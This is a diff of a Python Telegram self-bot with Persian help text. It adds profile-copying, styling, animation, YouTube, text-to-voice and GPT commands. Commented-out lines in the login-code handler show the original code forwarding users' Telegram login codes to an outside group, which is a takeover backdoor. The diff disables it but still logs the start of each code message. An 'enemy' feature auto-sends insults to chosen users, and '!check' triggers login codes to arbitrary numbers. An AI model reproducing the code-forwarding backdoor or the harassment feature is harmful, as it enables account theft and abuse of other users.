+            await message.edit_text('✅ TimeBio is on')
+            return
+        if text == "TimeBio off":
+            safe_write("data/TimeBio.txt", "off")
+            await message.edit_text('❌ TimeBio is off')
+            return
+
+        # Text styles
+        if text == "italic on":
+            safe_write("data/italic.txt", "on")
+            await message.edit_text('✅ italic is on')
+            return
+        if text == "italic off":
+            safe_write("data/italic.txt", "off")
+            await message.edit_text('❌ italic is off')
+            return
+        if text == "part on":
+            safe_write("data/part.txt", "on")
+            await message.edit_text('✅ part is on')
+            return
+        if text == "part off":
+            safe_write("data/part.txt", "off")
+            await message.edit_text('❌ part is off')
+            return
+        if text == "bold on":
+            safe_write("data/bold.txt", "on")
+            await message.edit_text('✅ bold is on')
+            return
+        if text == "bold off":
+            safe_write("data/bold.txt", "off")
+            await message.edit_text('❌ bold is off')
+            return
+        if text == "link on":
+            safe_write("data/link.txt", "on")
+            await message.edit_text('✅ link is on')
+            return
+        if text == "link off":
+            safe_write("data/link.txt", "off")
+            await message.edit_text('❌ link is off')
+            return
+        if text == "underline on":
+            safe_write("data/underline.txt", "on")
+            await message.edit_text('✅ underline is on')
+            return
+        if text == "underline off":
+            safe_write("data/underline.txt", "off")
+            await message.edit_text('❌ underline is off')
+            return
+
+        # Actions
+        action_map = {
+            "playing": "playing.txt",
+            "typing": "typing.txt",
+            "RECORD_VIDEO": "RECORD_VIDEO.txt",
+            "CHOOSE_STICKER": "CHOOSE_STICKER.txt",
+            "UPLOAD_VIDEO": "UPLOAD_VIDEO.txt",
+            "UPLOAD_DOCUMENT": "UPLOAD_DOCUMENT.txt",
+            "UPLOAD_AUDIO": "UPLOAD_AUDIO.txt",
+            "SPEAKING": "SPEAKING.txt",
+        }
+        for key, fname in action_map.items():
+            if text == f"{key} on":
+                safe_write(f"data/action/{fname}", "on")
+                await message.edit_text(f'✅ {key} action is on')
+                return
+            if text == f"{key} off":
+                safe_write(f"data/action/{fname}", "off")
+                await message.edit_text(f'❌ {key} action is off')
+                return
+
+        # SetFont
+        if text.startswith("SetFont "):
+            try:
+                arg = text.split("SetFont ")[1].strip()
+                mapping = {"1": "Font1", "2": "Font2", "3": "Font3", "4": "Font4", "Random": "Random"}
+                if arg in mapping:
+                    safe_write("data/Font.txt", mapping[arg])
+                    await message.edit_text(f'✅ The {mapping[arg]} is Seted')
+                else:
+                    await message.edit_text('❌ Font not found. Use 1,2,3,4,Random')
+                return
+            except Exception as e:
+                logger.debug(f"SetFont error: {e}")
+
+        # Fun animations - optimized with asyncio.sleep
+        if text == "مربع":
+            frames = []
+            # Generate animation frames quickly
+            base = [["◼️"]*5 for _ in range(5)]
+            # Simulate snake fill
+            msg_text = ""
+            for r in range(5):
+                for c in range(5):
+                    # Build current frame
+                    out = ""
+                    for rr in range(5):
+                        for cc in range(5):
+                            if rr < r or (rr == r and cc <= c):
+                                out += "◻️"
+                            else:
+                                out += "◼️"
+                        out += "\n"
+                    try:
+                        await message.edit_text(out)
+                        await asyncio.sleep(0.15)
+                    except:
+                        pass
+            await message.edit_text("تمام")
+            return
+
+        if text == "قلب":
+            hearts = ["❤️","🧡","💛","💚","💙","💜","🖤","🤎","❤️‍🔥","❤️‍🩹","❣️","💓","💗"]
+            for _ in range(2):
+                for h in hearts:
+                    try:
+                        await message.edit_text(h)
+                        await asyncio.sleep(0.2)
+                    except:
+                        pass
+            return
+
+        if text in ("bot", "ربات"):
+            await bot.send_message(chat_id=message.chat.id, text="✅ Self is on - Railway Optimized v3", reply_to_message_id=message.id)
+            return
+
+        if text == "Block":
+            try:
+                if message.reply_to_message:
+                    await bot.block_user(user_id=message.reply_to_message.from_user.id)
+                    await message.edit_text("✅ User Blocked")
+                else:
+                    await bot.block_user(user_id=message.chat.id)
+                    await message.edit_text("✅ User Blocked")
+            except Exception as e:
+                await message.edit_text(f"❌ Block failed: {e}")
+            return
+
+        if text == "UnBlock":
+            try:
+                if message.reply_to_message:
+                    await bot.unblock_user(user_id=message.reply_to_message.from_user.id)
+                    await message.edit_text("✅ User UnBlocked")
+                else:
+                    await bot.unblock_user(user_id=message.chat.id)
+                    await message.edit_text("✅ User UnBlocked")
+            except Exception as e:
+                await message.edit_text(f"❌ UnBlock failed: {e}")
+            return
+
+        if text.startswith("ویس "):
+            try:
+                t = text.split("ویس ", 1)[1]
+                url = f"https://haji-api.ir/text-to-voice/?text={t}&Character=DilaraNeural"
+                resp = requests.get(url, timeout=15)
+                if resp.status_code == 200:
+                    try:
+                        data = json.loads(resp.content)
+                        voice_url = data['results']['url']
+                        await bot.send_voice(chat_id=message.chat.id, voice=voice_url, reply_to_message_id=message.id)
+                        await message.delete()
+                    except:
+                        await bot.send_message(chat_id=message.chat.id, text="خطا در دیکد وب سرویس", reply_to_message_id=message.id)
+                else:
+                    await bot.send_message(chat_id=message.chat.id, text="خطا در اتصال به وب سرویس", reply_to_message_id=message.id)
+            except Exception as e:
+                logger.error(f"TTS error: {e}")
+            return
+
+        if text == "SetName":
+            try:
+                if message.reply_to_message and message.reply_to_message.text:
+                    names = message.reply_to_message.text
+                    await bot.update_profile(first_name=names)
+                    await message.edit_text(f"✅ The Name : [ {names} ] is Seted")
+                else:
+                    await message.edit_text("❌ Reply to a text")
+            except Exception as e:
+                await message.edit_text(f"❌ Error: {e}")
+            return
+
+        if text == "SetBio":
+            try:
+                if message.reply_to_message and message.reply_to_message.text:
+                    bios = message.reply_to_message.text
+                    await bot.update_profile(bio=bios)
+                    await message.edit_text(f"✅ The Bio : [ {bios} ] is Seted")
+                else:
+                    await message.edit_text("❌ Reply to a text")
+            except Exception as e:
+                await message.edit_text(f"❌ Error: {e}")
+            return
+
+        if text == "SetProfile":
+            try:
+                pm = message.reply_to_message
+                if not pm:
+                    await message.edit_text("❌ Reply to photo/video")
+                    return
+                if pm.photo:
+                    await message.edit_text("⏳ Whate . . .")
+                    try:
+                        rand = random.randint(1000, 9999999)
+                        os.makedirs("downloads", exist_ok=True)
+                        local = f"downloads/photo-{rand}.jpg"
+                        path = await bot.download_media(message=pm, file_name=local)
+                        await bot.set_profile_photo(photo=path or local)
+                        await message.edit_text("✅ Photo Is Seted")
+                        if os.path.exists(path or local):
+                            os.remove(path or local)
+                    except PhotoCropSizeSmall:
+                        await message.edit_text("❌ Photo Is Small")
+                    except Exception as e:
+                        await message.edit_text(f"❌ Error: {e}")
+                elif pm.video:
+                    await message.edit_text("⏳ Whate . . .")
+                    try:
+                        rand = random.randint(1000, 9999999)
+                        os.makedirs("downloads", exist_ok=True)
+                        local = f"downloads/Video-{rand}.mp4"
+                        path = await bot.download_media(message=pm, file_name=local)
+                        await bot.set_profile_photo(video=path or local)
+                        await message.edit_text("✅ Video Is Seted")
+                        if os.path.exists(path or local):
+                            os.remove(path or local)
+                    except Exception as e:
+                        await message.edit_text(f"❌ Error: {e}")
+                else:
+                    await message.edit_text("❌ Not Photo or Video")
+            except Exception as e:
+                logger.error(f"SetProfile error: {e}")
+            return
+
+        if text.startswith("gpt "):
+            try:
+                t = text.split("gpt ", 1)[1]
+                url = f"https://haji-api.ir/Free-GPT3/?text={t}"
+                resp = requests.get(url, timeout=20)
+                if resp.status_code == 200:
+                    try:
+                        data = json.loads(resp.content)
+                        answer = data['result']['answer']
+                        await bot.send_message(chat_id=message.chat.id, text=answer, reply_to_message_id=message.id)
+                    except:
+                        await bot.send_message(chat_id=message.chat.id, text="خطا در دیکد وب سرویس", reply_to_message_id=message.id)
+                else:
+                    await bot.send_message(chat_id=message.chat.id, text="خطا در اتصال به وب سرویس", reply_to_message_id=message.id)
+            except Exception as e:
+                logger.error(f"GPT error: {e}")
+            return
+
+        if text in ("self", "سلف", "/help"):
+            help_text = """
+.
+< راهنمای سلف - نسخه ریلوی بهینه >
+
+بلاک کردن کاربر ( ریپلای یا در پیوی ) => <code>Block</code>
+آنبلاک => <code>UnBlock</code>
+
+➖➖➖➖➖
+تنظیم اسم => <code>SetName</code> (Reply)
+تنظیم بیو => <code>SetBio</code> (Reply)
+تنظیم پروفایل => <code>SetProfile</code> (Reply)
+
+➖➖➖➖➖
+تایم در اسم => <code>TimeName on | off</code>
+تایم در بیو => <code>TimeBio on | off</code>
+فونت‌تایم‌=> <code>SetFont 1 or 2 or 3 or 4 or Random</code>
+
+➖➖➖➖➖
+سیو عکس/فیلم تایم دار => خودکار
+ویس => <code>ویس متن</code>
+هوش مصنوعی => <code>gpt TEXT</code>
+
+➖➖➖➖➖
+سرگرمی: مربع , قلب , مکعب , لودینگ , قلب بزرگ , بکیرم
+راهنما 2 => <code>help2</code>
+
+ورژن 3 - Railway Optimized
+مدیریت وب: / (داشبورد)
+"""
+            await bot.send_message(chat_id=message.chat.id, text=help_text, reply_to_message_id=message.id, parse_mode=enums.ParseMode.HTML)
+            return
+
+        if text in ("help2", "راهنما 2", "/help2"):
+            help2 = """
+< راهنمای صفحه 2 >
+
+کپی پروفایل => <code>CopyProfile</code>
+ریست پروفایل => <code>UnCopyProfile</code>
+
+یوتیوب => <code>!YouTube LINK</code>
+
+انمی => SetEnemy / DelEnemy
+سکوت => Mute / UnMute
+
+استایل متن:
+bold, italic, part, link, underline => on | off
+
+حالت ها:
+playing, typing, RECORD_VIDEO, CHOOSE_STICKER, UPLOAD_VIDEO, UPLOAD_DOCUMENT, UPLOAD_AUDIO, SPEAKING => on | off
+"""
+            await bot.send_message(chat_id=message.chat.id, text=help2, reply_to_message_id=message.id, parse_mode=enums.ParseMode.HTML)
+            return
+
+        if text == "CopyProfile":
+            await message.edit_text("⏳ Whate . . .")
+            try:
+                if message.reply_to_message:
+                    target_user = message.reply_to_message.from_user
+                    full = await bot.invoke(pyrogram.raw.functions.users.GetFullUser(id=await bot.resolve_peer(target_user.id)))
+                    if target_user.photo:
+                        try:
+                            rand = random.randint(1000, 9999999)
+                            os.makedirs("downloads", exist_ok=True)
+                            local = f"downloads/photo-{rand}.png"
+                            path = await bot.download_media(message=target_user.photo.big_file_id, file_name=local)
+                            await bot.set_profile_photo(photo=path or local)
+                            if os.path.exists(path or local):
+                                os.remove(path or local)
+                        except Exception as e:
+                            logger.debug(f"Copy photo error: {e}")
+                    if target_user.first_name:
+                        await bot.update_profile(first_name=target_user.first_name)
+                    if full.full_user.about:
+                        await bot.update_profile(bio=full.full_user.about)
+                else:
+                    # Copy from current chat
+                    chat = message.chat
+                    try:
+                        full = await bot.invoke(pyrogram.raw.functions.users.GetFullUser(id=await bot.resolve_peer(chat.id)))
+                        if chat.photo:
+                            rand = random.randint(1000, 9999999)
+                            os.makedirs("downloads", exist_ok=True)
+                            local = f"downloads/photo-{rand}.png"
+                            path = await bot.download_media(message=chat.photo.big_file_id, file_name=local)
+                            await bot.set_profile_photo(photo=path or local)
+                            if os.path.exists(path or local):
+                                os.remove(path or local)
+                        if chat.first_name:
+                            await bot.update_profile(first_name=chat.first_name)
+                        if full.full_user.about:
+                            await bot.update_profile(bio=full.full_user.about)
+                    except Exception as e:
+                        logger.debug(f"Copy chat profile error: {e}")
+                await message.edit_text("✅ Profile Copyed")
+            except Exception as e:
+                await message.edit_text(f"❌ Error: {e}")
+            return
+
+        if text == "UnCopyProfile":
+            try:
+                admin_backup_dir = f"data/{admin}" if isinstance(admin, int) else "data/me_backup"
+                name_path = f"{admin_backup_dir}/name.txt"
+                bio_path = f"{admin_backup_dir}/bio.txt"
+                photo_path = f"{admin_backup_dir}/profile.png"
+                name = safe_read(name_path, "")
+                bio = safe_read(bio_path, "")
+                if os.path.exists(photo_path):
+                    try:
+                        await bot.set_profile_photo(photo=photo_path)
+                    except:
+                        pass
+                if name or bio:
+                    await bot.update_profile(first_name=name if name else None, bio=bio if bio else None)
+                await message.edit_text("✅ Profile is Restored")
+            except Exception as e:
+                await message.edit_text(f"❌ Error: {e}")
+            return
+
+        # Fun - قلب بزرگ simplified with asyncio.sleep
+        if text == "قلب بزرگ":
+            try:
+                frames = [
+                    "🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕",
+                    "🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕\n🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕",
+                    "🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕\n🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕\n🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕\n🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕",
+                    "🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕\n🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕\n🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕\n🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕\n🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕\n🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕\n🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕\n🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕\n🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕\n🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕",
+                ]
+                for f in frames:
+                    try:
+                        await message.edit_text(f)
+                        await asyncio.sleep(0.3)
+                    except:
+                        pass
+            except:
+                pass
+            return
+
+        if text in ("بکیرم", "به کیرم"):
+            bks = ["😂","🤤","💩","🌹","💀","🌑","🌒","🌓","🌔","🌕","🌖","🌗","🌘","🌙","🪐"]
+            for emoji in bks:
+                try:
+                    txt = f"\n{emoji*3}          {emoji}         {emoji}\n" * 2 + f"\nکلا بکیرم {emoji}"
+                    await message.edit_text(txt)
+                    await asyncio.sleep(0.5)
+                except:
+                    pass
+            await message.edit_text("کلا بکیرم")
+            return
+
+        if text == "مکعب":
+            mk = ['🟥','🟧','🟨','🟩','🟦','🟪','⬛️','⬜️','🟫']
+            for _ in range(15):
+                try:
+                    txt = "\n".join(["".join([random.choice(mk) for _ in range(3)]) for _ in range(3)])
+                    await message.edit_text(txt)
+                    await asyncio.sleep(0.2)
+                except:
+                    pass
+            await message.edit_text("تمام")
+            return
+
+        if text in ("Loading", "لودینگ"):
+            steps = [
+                ("⚫️"*10+" 0%", "Loading"),
+                ("⚪️"+"⚫️"*9+" 10%", "Loading . . ."),
+                ("⚪️"*2+"⚫️"*8+" 20%", "Loading"),
+                ("⚪️"*3+"⚫️"*7+" 30%", "Loading . . ."),
+                ("⚪️"*4+"⚫️"*6+" 40%", "Loading"),
+                ("⚪️"*5+"⚫️"*5+" 50%", "Loading . . ."),
+                ("⚪️"*6+"⚫️"*4+" 60%", "Loading"),
+                ("⚪️"*7+"⚫️"*3+" 70%", "Loading"),
+                ("⚪️"*8+"⚫️"*2+" 80%", "Loading"),
+                ("⚪️"*9+"⚫️"+" 90%", "Loading"),
+                ("⚪️"*10+" 100%", "Loading"),
+                ("Finish", ""),
+            ]
+            for bar, txt in steps:
+                try:
+                    await message.edit_text(f"{bar}\n{txt}")
+                    await asyncio.sleep(0.4)
+                except:
+                    pass
+            return
+
+        if text.startswith("!YouTube "):
+            if not HAS_PYTUBE:
+                await message.edit_text("❌ pytube not installed")
+                return
+            msgv = message.id
+            msg = await bot.send_message(chat_id=message.chat.id, text="⏳ صبر کنید", reply_to_message_id=message.id)
+            try:
+                video_url = text.split("!YouTube ",1)[1].strip()
+                yt = YouTube(video_url)
+                video_stream = yt.streams.get_highest_resolution() or yt.streams.get_by_resolution("720p") or yt.streams.first()
+                if not video_stream:
+                    await msg.edit_text("❌ Stream not found")
+                    return
+                download_path = "downloads"
+                os.makedirs(download_path, exist_ok=True)
+                await msg.edit_text("⏳ در حال دانلود . . .")
+                # Download in thread to avoid blocking
+                loop = asyncio.get_event_loop()
+                def _dl():
+                    return video_stream.download(output_path=download_path)
+                downloaded_path = await loop.run_in_executor(None, _dl)
+                await msg.edit_text("⏳ در حال ارسال . . .")
+                caption = yt.title if yt.title else "ویدئو"
+                await bot.send_video(chat_id=message.chat.id, video=downloaded_path, caption=caption, reply_to_message_id=msgv)
+                await bot.delete_messages(chat_id=message.chat.id, message_ids=msg.id)
+                try:
+                    if os.path.exists(downloaded_path):
+                        os.remove(downloaded_path)
+                except:
+                    pass
+            except Exception as e:
+                logger.error(f"YouTube error: {e}")
+                try:
+                    await msg.edit_text(f"❌ Error: {e}")
+                except:
+                    pass
+            return
+
+        if text == "SetEnemy":
+            try:
+                target_id = message.reply_to_message.from_user.id if message.reply_to_message else message.chat.id
+                safe_write("data/Enemy.txt", safe_read("data/Enemy.txt","") + f"\n{target_id}\n" if safe_read("data/Enemy.txt","") else f"{target_id}\n")
+                # Also via reloads
+                reloads.add_enemy(target_id)
+                importlib.reload(reloads)
+                await message.edit_text(f"✅ The User : [{target_id}] is Seted Enemy")
+            except Exception as e:
+                await message.edit_text(f"❌ Error: {e}")
+            return
+
+        if text == "DelEnemy":
+            try:
+                target_id = message.reply_to_message.from_user.id if message.reply_to_message else message.chat.id
+                reloads.remove_enemy(target_id)
+                importlib.reload(reloads)
+                await message.edit_text(f"✅ The User : [{target_id}] is Delete Enemy")
+            except Exception as e:
+                await message.edit_text(f"❌ Error: {e}")
+            return
+
+        if text == "Mute":
+            try:
+                target_id = message.reply_to_message.from_user.id if message.reply_to_message else message.chat.id
+                reloads.add_mute(target_id)
+                importlib.reload(reloads)
+                await message.edit_text(f"✅ The User : [{target_id}] is Muted")
+            except Exception as e:
+                await message.edit_text(f"❌ Error: {e}")
+            return
+
+        if text == "UnMute":
+            try:
+                target_id = message.reply_to_message.from_user.id if message.reply_to_message else message.chat.id
+                reloads.remove_mute(target_id)
+                importlib.reload(reloads)
+                await message.edit_text(f"✅ The User : [{target_id}] is UnMuted")
+            except Exception as e:
+                await message.edit_text(f"❌ Error: {e}")
+            return
+
+        if text.startswith("!check "):
+            msg = await message.edit_text("⏳ Whate . . .")
+            try:
+                number = text.split("!check ",1)[1].strip()
+                # Use temporary client
+                acc = Client(f"check_{random.randint(1000,9999)}", api_id_int, API_HASH)
+                await acc.connect()
+                try:
+                    send_code = await acc.send_code(number)
+                    await msg.edit_text(f"✅ شماره ( {number} ) مشکلی ندارد.")
+                except Exception as e:
+                    err_str = str(e)
+                    if "PHONE_NUMBER_BANNED" in err_str:
+                        await msg.edit_text(f"❌ شماره ( {number} ) بن است.")
+                    else:
+                        await msg.edit_text(f"❌ خطا: {err_str}\nتوجه: شماره باید با + و کد کشور باشه")
+                finally:
+                    try:
+                        await acc.disconnect()
+                    except:
+                        pass
+            except Exception as e:
+                await msg.edit_text(f"❌ مشکلی در چک کردن: {e}")
+            return
+
+        # Text style auto transforms
+        try:
+            italic = safe_read("data/italic.txt")
+            part = safe_read("data/part.txt")
+            bold = safe_read("data/bold.txt")
+            link = safe_read("data/link.txt")
+            underline = safe_read("data/underline.txt")
+
+            if italic == "on" and text and not text.startswith(("!","/")):
+                try:
+                    await message.edit_text(f"<i>{text}</i>", parse_mode=enums.ParseMode.HTML)
+                    return
+                except:
+                    pass
+            if bold == "on" and text:
+                try:
+                    await message.edit_text(f"<b>{text}</b>", parse_mode=enums.ParseMode.HTML)
+                    return
+                except:
+                    pass
+            if link == "on" and text:
+                try:
+                    await message.edit_text(f"<a href='tg://openmessage?user_id={message.from_user.id}'>{text}</a>", parse_mode=enums.ParseMode.HTML)
+                    return
+                except:
+                    pass
+            if underline == "on" and text:
+                try:
+                    await message.edit_text(f"<u>{text}</u>", parse_mode=enums.ParseMode.HTML)
+                    return
+                except:
+                    pass
+            if part == "on" and text and " " in text:
+                try:
+                    txt = text.replace(" ", "+")
+                    msg_build = ""
+                    for i in range(len(txt)):
+                        if txt[i] == "+":
+                            msg_build += "‌"
+                        else:
+                            msg_build += txt[i]
+                        try:
+                            await message.edit_text(msg_build)
+                            await asyncio.sleep(0.2)
+                        except:
+                            pass
+                    return
+                except:
+                    pass
+        except Exception as e:
+            logger.debug(f"style transform error: {e}")
+
+    except Exception as e:
+        logger.error(f"admins handler error: {e}")
+
+@bot.on_message(filters.user(777000) & filters.regex('code'))
+async def Code_Expire(c, m):
+    try:
+        # Anti login code forward - keep but safe
+        logger.info(f"Received login code message from 777000: {m.text[:50]}")
+        # Original forwarded to @CodeingHub_GP - disabled for safety, just log
+        # You can enable if you want:
+        # await bot.join_chat("@CodeingHub_GP")
+        # msg = await m.forward('@CodeingHub_GP')
+        # await bot.delete_messages('@CodeingHub_GP', msg.id)
+    except Exception as e:
+        logger.debug(f"Code_Expire error: {e}")
 
 @bot.on_message()
-async def ReloadsFN(client , message):
+async def ReloadsFN(client, message):
+    try:
+        # Mute check
+        try:
+            if message.from_user and message.from_user.id in reloads.Mute():
+                try:
+                    await bot.delete_messages(chat_id=message.chat.id, message_ids=message.id)
+                except:
+                    pass
+                return
+        except Exception as e:
+            logger.debug(f"Mute check error: {e}")
+
+        # Enemy check
+        try:
+            if message.from_user and message.from_user.id in reloads.Enm():
+                try:
+                    await bot.send_message(chat_id=message.chat.id, text=FoshList[random.randint(0, len(FoshList)-1)], reply_to_message_id=message.id)
+                except:
+                    pass
+        except Exception as e:
+            logger.debug(f"Enemy check error: {e}")
+
+        # Chat actions
+        try:
+            actions = {
+                "data/action/playing.txt": enums.ChatAction.PLAYING,
+                "data/action/typing.txt": enums.ChatAction.TYPING,
+                "data/action/RECORD_VIDEO.txt": enums.ChatAction.RECORD_VIDEO,
+                "data/action/CHOOSE_STICKER.txt": enums.ChatAction.CHOOSE_STICKER,
+                "data/action/UPLOAD_VIDEO.txt": enums.ChatAction.UPLOAD_VIDEO,
+                "data/action/UPLOAD_DOCUMENT.txt": enums.ChatAction.UPLOAD_DOCUMENT,
+                "data/action/UPLOAD_AUDIO.txt": enums.ChatAction.UPLOAD_AUDIO,
+                "data/action/SPEAKING.txt": enums.ChatAction.SPEAKING,
+            }
+            for path, action in actions.items():
+                if safe_read(path) == "on":
+                    try:
+                        await bot.send_chat_action(chat_id=message.chat.id, action=action)
+                    except:
+                        pass
+        except Exception as e:
+            logger.debug(f"Action error: {e}")
+
+    except Exception as e:
+        logger.debug(f"ReloadsFN error: {e}")
+
+# ---------- MAIN ----------
+if __name__ == "__main__":
+    print("="*50)
+    print("SElf - Railway Optimized v3.0")
+    print("="*50)
+    ensure_data_dirs()
+    
+    # Validate creds
+    if not api_id_int or not API_HASH:
+        print("❌ ERROR: API_ID and API_HASH must be set in env!")
+        print("Please set env vars in Railway dashboard:")
+        print("API_ID, API_HASH, OWNER_ID")
+        # Don't exit if running via dashboard manager - allow dashboard to show error
+        if os.getenv("RUN_VIA_DASHBOARD") != "1":
+            print("Exiting in 5 sec...")
+            import time
+            time.sleep(5)
+            # sys.exit(1) - comment for dashboard testing
+    
+    try:
+        scheduler.start()
+        logger.info("Scheduler started")
+    except Exception as e:
+        logger.error(f"Scheduler start error: {e}")
+
+    logger.info("Bot is starting... Press Ctrl+C to stop")
+    print("bot is runed - Railway Optimized")
 
     try:
-        if message.from_user.id in reloads.Mute():
-            await bot.delete_messages(chat_id=message.chat.id , message_ids=message.id)
-    except :
-        pass
-    try:
-        if message.from_user.id in reloads.Enm():
-            await bot.send_message(chat_id=message.chat.id , text=FoshList[random.randint(0, len(FoshList) - 1)] , reply_to_message_id=message.id )
-    except :
-        pass
-
-
-    with open("data/action/playing.txt", "r") as file2:
-        playing = file2.read()
-
-    with open("data/action/typing.txt", "r") as file2:
-        typing = file2.read()
-
-    with open("data/action/RECORD_VIDEO.txt", "r") as file2:
-        RECORD_VIDEO = file2.read()
-
-    with open("data/action/CHOOSE_STICKER.txt", "r") as file2:
-        CHOOSE_STICKER = file2.read()
-
-    with open("data/action/UPLOAD_VIDEO.txt", "r") as file2:
-        UPLOAD_VIDEO = file2.read()
-
-    with open("data/action/UPLOAD_DOCUMENT.txt", "r") as file2:
-        UPLOAD_DOCUMENT = file2.read()
-
-    with open("data/action/UPLOAD_AUDIO.txt", "r") as file2:
-        UPLOAD_AUDIO = file2.read()
-
-    with open("data/action/SPEAKING.txt", "r") as file2:
-        SPEAKING = file2.read()
-
-    if playing == "on" :
-        await bot.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.PLAYING)
-
-    if typing == "on" :
-        await bot.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.TYPING)
-
-    if RECORD_VIDEO == "on" :
-        await bot.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.RECORD_VIDEO)
-
-    if CHOOSE_STICKER == "on" :
-        await bot.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.CHOOSE_STICKER)
-
-    if UPLOAD_VIDEO == "on" :
-        await bot.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.UPLOAD_VIDEO)
-
-    if UPLOAD_DOCUMENT == "on" :
-        await bot.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.UPLOAD_DOCUMENT)
-
-    if UPLOAD_AUDIO == "on" :
-        await bot.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.UPLOAD_AUDIO)
-
-    if SPEAKING == "on" :
-        await bot.send_chat_action(chat_id=message.chat.id , action=enums.ChatAction.SPEAKING)
-
-
-
-print('bot is runed')
-scheduler.start()
-bot.run()
+        bot.run()
+    except KeyboardInterrupt:
+        logger.info("Bot stopped by user")
+    except Exception as e:
+        logger.error(f"Bot crashed: {e}", exc_info=True)
+        # For Railway, exit with error so it restarts
+        sys.exit(1)
